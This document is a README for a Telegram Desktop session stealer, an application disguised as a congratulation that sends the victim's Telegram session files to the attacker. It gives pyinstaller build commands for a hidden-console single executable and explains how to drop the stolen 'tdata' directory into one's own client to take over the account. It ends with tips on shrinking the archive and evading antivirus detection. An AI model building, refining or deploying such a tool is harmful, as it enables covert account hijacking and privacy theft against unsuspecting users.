# Telegram_Desktop_session_stealer
Application that steals the Telegram Desctop session and looks like congratulation. The only thing that can arouse suspicion is the "exe" extension.

# Instruction
1) To create standalone application type: "pyinstaller --add-data "*.png;." --add-data "*.gif;." --noconsole --onefile main.py".
2) Close Telegram Desktop and replace "tdata" directory with received one. The Telegram Desktop will start with new session.


# Warning
You can't log in with received files while the session is active. User also can not use session while you are using it. Code will not send you the archive if there is no Internet connection on user's PC

# Enhancements
For decreasing the sent archive you can check the importance of every packed file and choose which of them you will send.
Two VirusTotal's security vendors detect file as malware or trojan. This porblem can be solved if the code doesn't remove our zip file.
